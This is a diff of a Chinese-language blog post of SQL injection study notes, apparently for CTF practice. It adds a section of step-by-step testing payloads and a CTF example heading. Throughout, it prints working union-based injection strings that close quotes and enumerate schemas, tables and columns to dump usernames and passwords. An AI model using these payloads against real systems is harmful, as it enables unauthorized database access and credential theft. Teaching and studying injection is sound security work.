@@ -6,7 +6,7 @@
     <meta name="keywords" content="Hexo Theme Redefine">
     <meta name="description" content="Hexo Theme Redefine">
     <meta name="author" content="Orange Wang">
-    <link rel="canonical" href="http://example.com/2023/01/02/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" />
+    <link rel="canonical" href="http://example.com/2023/01/02/SQL%E6%B3%A8%E5%85%A5/" />
     <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
     <link rel="icon" type="image/png" href="/images/favicon of my blog.jpg" sizes="192x192">
     <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon of my blog.jpg">
@@ -14,7 +14,7 @@
     
     <title>
         
-            SQL注入笔记 |
+            SQL注入 |
         
         Orange Wang&#39;s Blog
     </title>
@@ -189,7 +189,7 @@
     <div class="post-page-container">
         <div class="article-content-container">
             <div class="article-title">
-                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">SQL注入笔记</h1></span>
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">SQL注入</h1></span>
             </div>
 
             
@@ -285,18 +285,20 @@
 <p>在输入框里输入<code>gifts&#39; union select 1,database(),3,4#</code>即可拿到数据库名。<br>拿到数据库名后，接下来拿表名：<br>在输入框里输入<code>1&#39; union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#</code>得到表名。<br>接下来分析表字段(假设有一张表，名为user)：<br>输入<code>1&#39; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()#</code><br>指出当前数据库中的名为user的表中的字段名<br>假设有字段名为username和password<br>则输入<code>1&#39;union select 1,username,password,4 from user #</code><br>可以拿到用户名和密码！！！</p>
 <h2 id="POST型SQL注入漏洞"><a href="#POST型SQL注入漏洞" class="headerlink" title="POST型SQL注入漏洞"></a>POST型SQL注入漏洞</h2><p>提交的内容在url上没有显示，是post型与get型的区别之一<br>方法：提交，F12看“网络”Network部分，再点提交，找php文件！<br>首先看到<code>请求URL</code>,即是post注入的地址，<br>再找到最下面form data,里面有post注入的参数（字段）</p>
 <p>判断一下注入类型：<strong>并不是所有的注入都要加单引号闭合！</strong><br>如果注入位置的数据类型为整型则不用加单引号</p>
-
+<h2 id="SQL注入测试的一般步骤"><a href="#SQL注入测试的一般步骤" class="headerlink" title="SQL注入测试的一般步骤"></a>SQL注入测试的一般步骤</h2><p>1、 找到注入点<br>   单引号、两个单引号、and 1&#x3D;1、and 1&#x3D;2、or 1&#x3D;1等尝试，找到对查询结果有影响的参数<br>2、闭合语句<br>       or 1&#x3D;1 –+<br>       ’ or 1&#x3D;1 –+<br>       “ or 1&#x3D;1 –+<br>       ) or 1&#x3D;1 –+<br>       ‘) or 1&#x3D;1 –+<br>       ‘)) or 1&#x3D;1 –+<br>       “) or 1&#x3D;1 –+<br>       “)) or 1&#x3D;1 –+<br>       –+用于注释sql语句中的后引号，–后的+号主要作用是提供一个空格，sql语句单行注释后需有空格，+会被解码为空格；注释符号还有#和内联注释&#x2F;<em>…</em>&#x2F;<br>3、带入语句进行爆破<br>      1）order by 确认几个字段<br>      2）联合查询确定回显位置<br>            union select 1,2<br>      3）爆数据库版本、数据库名称、用户名称等<br>            union select @@version,database(),user()<br>      4）爆所有数据库<br>            union select group_concat(schema_name) from information_schema.schemata<br>      5）爆所有表<br>            union select group_concat(table_name) from information_schema.tables where table_schema &#x3D;’&lt;数据库名&gt;’<br>      6）爆对应表的所有字段<br>            union select group_concat(column_name) from information_schema.columns where table_name&#x3D;’&lt;表名&gt;’<br>      7）爆表中数据<br>            union select group_concat(&lt;字段1&gt;,’ ‘,&lt;字段2&gt;) from &lt;表名&gt;</p>
+<h2 id="sql注入例题"><a href="#sql注入例题" class="headerlink" title="sql注入例题"></a>sql注入例题</h2><h3 id="1-BUU-SQL-COURSE-1"><a href="#1-BUU-SQL-COURSE-1" class="headerlink" title="1.BUU SQL COURSE 1"></a>1.BUU SQL COURSE 1</h3><p>题解：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43785509/article/details/127914154?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~Rate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~Rate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1%EF%BC%9B" >https://blog.csdn.net/weixin_43785509/article/details/127914154?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1； <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>
             </div>
 
             
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：SQL注入笔记</li>
+        <li>Post title：SQL注入</li>
         <li>Post author：Orange Wang</li>
         <li>Create time：2023-01-02 22:32:53</li>
         <li>
-            Post link：https://redefine.ohevan.com/2023/01/02/SQL注入笔记/
+            Post link：https://redefine.ohevan.com/2023/01/02/SQL注入/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -354,7 +356,7 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E7%AE%80%E4%BB%8B"><span class="nav-text">mysql简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BSQL%E8%AF%AD%E6%B3%95"><span class="nav-text">一些SQL语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">判断是否存在SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">GET型SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">POST型SQL注入漏洞</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E7%AE%80%E4%BB%8B"><span class="nav-text">mysql简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BSQL%E8%AF%AD%E6%B3%95"><span class="nav-text">一些SQL语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">判断是否存在SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">GET型SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">POST型SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="nav-text">SQL注入测试的一般步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BE%8B%E9%A2%98"><span class="nav-text">sql注入例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-BUU-SQL-COURSE-1"><span class="nav-text">1.BUU SQL COURSE 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2"><span class="nav-text">2.</span></a></li></ol></li></ol>
     </div>
 </div>
             </div>
